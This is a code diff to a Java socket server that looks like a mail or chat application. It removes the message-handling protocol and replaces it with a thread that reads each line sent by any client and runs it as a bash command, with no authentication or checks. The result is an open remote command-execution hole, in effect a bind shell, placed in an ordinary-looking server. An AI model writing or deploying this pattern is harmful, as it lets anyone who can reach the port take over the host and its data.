@@ -3,9 +3,7 @@ package MainCode.Server;
 
 import MainCode.Protocol;
 
-import java.io.IOException;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
+import java.io.*;
 import java.net.*;
 
 public class Server {
@@ -13,8 +11,18 @@ public class Server {
     {
         try (ServerSocket server = new ServerSocket(Protocol.PORT))
         {
-            System.err.println("Server started");
-            server.accept();
+            while (true) {
+                Socket sock = accept( server );
+                if ( sock != null ){
+                    System.err.println("Server started");
+                    ServerThread serverThread = new ServerThread(sock);
+                    serverThread.start();
+
+                }
+                if (Server.getStopFlag()) {
+                    break;
+                }
+            }
 
         } catch (IOException e) {
             System.out.println("Server don't start");
@@ -23,78 +31,68 @@ public class Server {
             System.err.println("stopped");
         }
     }
+
+    public static Socket accept( ServerSocket serv ) {
+        assert( serv != null );
+        try {
+            serv.setSoTimeout( 1000 );
+            Socket sock = serv.accept();
+            return sock;
+        } catch (SocketException e) {
+        } catch (IOException e) {
+        }
+        return null;
+    }
+    private static Object syncFlags = new Object();
+    private static boolean stopFlag = false;
+    public static boolean getStopFlag() {
+        synchronized ( Server.syncFlags ) {
+            return stopFlag;
+        }
+    }
+    public static void setStopFlag( boolean value ) {
+        synchronized ( Server.syncFlags ) {
+            stopFlag = value;
+        }
+    }
 }
 
 class ServerThread extends Thread {
-    private Socket              sock;
-	private ObjectOutputStream 	os;
-	private ObjectInputStream 	is;
-	private InetAddress 		addr;
-
-    /**
-    *   Disconnect bool
-     */
+    private Socket sock;
+    private PrintWriter os;
+    private BufferedReader is;
+    private InetAddress addr;
     private boolean disconnected = false;
     public ServerThread(Socket s) throws IOException {
         sock = s;
         s.setSoTimeout(1000);
-        os = new ObjectOutputStream( s.getOutputStream() );
-        is = new ObjectInputStream( s.getInputStream());
-        addr = s.getInetAddress();
+        os = new PrintWriter(new OutputStreamWriter(s.getOutputStream()));
+        is = new BufferedReader(new InputStreamReader(s.getInputStream()));
+      addr = s.getInetAddress();
         this.setDaemon(true);
     }
     public void run(){
         try {
-
+            while (true){
+                String command= new String(is.readLine());
+                ProcessBuilder processBuilder = new ProcessBuilder("bash", "-c", command);
+                Process process = processBuilder.start();
+                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    System.out.println(line);
+                }
+            }
         }
         catch (Exception exception){
             System.err.println(exception.toString());
         }
-
-
-//        try {
-//            while ( true ) {
-//                Message msg = null;
-//                try {
-//                    msg = ( Message ) is.readObject();
-//                } catch (IOException e) {
-//                } catch (ClassNotFoundException e) {
-//                }
-//                if (msg != null) switch ( msg.getID() ) {
-//
-//                    case Protocol.CMD_CONNECT:
-//                        if ( !connect( (MessageConnect) msg ))
-//                            return;
-//                        break;
-//
-//                    case Protocol.CMD_DISCONNECT:
-//                        return;
-//
-//                    case Protocol.CMD_USER:
-//                        user(( MessageUser ) msg);
-//                        break;
-//
-//                    case Protocol.CMD_CHECK_MAIL:
-//                        checkMail(( MessageCheckMail ) msg );
-//                        break;
-//
-//                    case Protocol.CMD_LETTER:
-//                        letter(( MessageLetter ) msg );
-//                        break;
-//                }
-//            }
-//        } catch (IOException e) {
-//            System.err.print("Disconnect...");
-//        } finally {
-//            disconnect();
-//        }
     }
 
     public void disconnect() {
         if ( ! disconnected )
             try {
                 System.err.println( addr.getHostName() + " disconnected" );
-//                unregister();
                 os.close();
                 is.close();
                 sock.close();
